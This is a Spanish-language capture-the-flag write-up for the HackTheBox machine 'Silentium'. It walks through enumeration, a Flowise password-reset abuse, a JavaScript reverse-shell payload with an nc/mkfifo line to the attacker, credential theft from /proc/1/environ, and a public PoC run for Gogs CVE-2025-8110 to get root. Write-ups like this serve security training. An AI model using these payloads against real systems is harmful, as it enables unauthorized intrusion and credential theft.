![My imagen](/silentium/Silentium.png)

# Silentium — HackTheBox Writeup

## Reconocimiento
### Verificación de conectividad
Antes de comenzar, verificamos que la máquina objetivo es alcanzable:
```js
ping -c 1 10.129.26.147
```
### Escaneo de puertos
Realizamos un escaneo completo de puertos para identificar los servicios expuestos:
```js
nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.129.26.147 -oG allPorts
```
![My imagen](/silentium/1silentium.jpeg)

El escaneo revela dos puertos abiertos: 22 (SSH) y 80 (HTTP).
### Enumeración de servicios
Ejecutamos scripts de detección de versiones sobre los puertos descubiertos:
```js
nmap -sCV -p22,80 10.129.26.147 -oN target
```
![My imagen](/silentium/2silentium.jpeg)

El puerto 22 ejecuta una versión actualizada de OpenSSH, por lo que no representa un vector de entrada viable. El puerto 80 expone un servidor HTTP que procedemos a analizar.

## Enumeración Web
### Descubrimiento de directorios
Enumeramos directorios sobre el dominio principal:
```js
gobuster dir -u http://silentium.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --exclude-length 8753
```
![My imagen](/silentium/3silentium.jpeg)
Todos los resultados retornan código 301, lo que indica redirección global. El único directorio encontrado es /assets, que no aporta información relevante.
### Descubrimiento de subdominios
Procedemos a enumerar subdominios mediante fuzzing de cabeceras HTTP:
```js
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301
```
![My imagen](/silentium/4silentium.jpeg)
Se descubre el subdominio staging. Lo añadimos al archivo /etc/hosts y accedemos a http://staging.silentium.htb.

## Acceso Inicial
### Identificación de usuario válido
El subdominio expone un formulario de login perteneciente a una instancia de Flowise, una plataforma para la creación de agentes de IA. Analizando la página principal del sitio, identificamos que uno de los responsables del proyecto se llama ben.
Al intentar autenticarse con el correo ben@silentium.htb, el mensaje de error cambia de "usuario no encontrado" a "email o contraseña incorrecta", confirmando que ben es un usuario válido en el sistema.
### Restablecimiento de contraseña
Obtenemos un token temporal de restablecimiento mediante la API:
```js
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```
![My imagen](/silentium/5silentium.jpeg)
Usamos el token obtenido para establecer una nueva contraseña:
```js
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "striagF5snr1DTM9XS0XV3AOzxJLJGpy281mZcJrp1CPHNvs9iDjlyvxj42hym91",
      "password": "Password123!"
    }
  }'
```
Accedemos al dashboard de Flowise con las credenciales:

**Usuario:** ben@silentium.htb
**Contraseña:** Password123!

### Ejecución remota de código en Flowise
Iniciamos un listener en nuestra máquina atacante:
```js
nc -lvnp 4444
```
En el dashboard de Flowise, navegamos a Chatflows, creamos uno nuevo y añadimos el componente Custom MCP. En el campo MCP Server Config introducimos el siguiente payload de reverse shell:
```js
({
  x: (function() {
    const cp = process.mainModule.require('child_process');
    cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <TU_IP> 4444 >/tmp/f');
    return 1;
  })()
})
```
Al guardar y ejecutar el chatflow, recibimos una shell en el listener.

## Escalada al Usuario ben (Escape de Docker)
El shell inicial se encuentra dentro de un contenedor Docker. Para obtener credenciales del sistema host, inspeccionamos las variables de entorno del proceso principal:
```js
cat /proc/1/environ | tr '\0' '\n'
```
![My imagen](/silentium/6silentium.png)
Las variables revelan credenciales en texto claro que nos permiten autenticarnos por SSH directamente en el host:
```js
ssh ben@10.129.21.212
```
Una vez dentro, obtenemos la flag de usuario.
![My imagen](/silentium/7silentium.png)

## Escalada de Privilegios
### Descubrimiento de servicios internos
Enumeramos los servicios escuchando en interfaces locales:
```js
netstat -tulpn | grep 127.0.0.1
```
Se identifica un servicio en el puerto **3001**, correspondiente a una instancia de Gogs **v0.13.0***.
### Reenvío de puertos
Desde nuestra máquina atacante creamos un túnel SSH para acceder al servicio:
```js
ssh -L 3001:127.0.0.1:3001 ben@10.129.21.212
```
Accedemos a http://localhost:3001 desde el navegador.
### Registro de cuenta en Gogs
Navegamos a http://localhost:3001/user/sign_up y registramos una cuenta. A continuación, generamos un token de API desde **Ajustes → Aplicaciones**.
### Explotación — CVE-2025-8110
Gogs v0.13.0 es vulnerable a **CVE-2025-8110**, una condición de carrera basada en symlinks que permite inyectar un sshCommand arbitrario en el archivo .git/config de un repositorio, logrando ejecución de código cuando un proceso privilegiado ejecuta operaciones Git.

Localizamos el PoC en GitHub y lo ejecutamos desde nuestra máquina atacante con un listener activo en el puerto 5555:
```js
# Terminal 1 — Listener
nc -lvnp 5555
```
```js
# Terminal 2 — Exploit
python3 exploit.py -u http://localhost:3001 -lh 10.10.16.184 -lp 5555 -U test -P test123
```
Recibimos una shell como **root**.
Flag de root
```js
cat /root/root.txt
```
![My imagen](/silentium/8silentium.png)

Máquina completada exitosamente en HackTheBox.

![My imagen](/silentium/9silentium.png)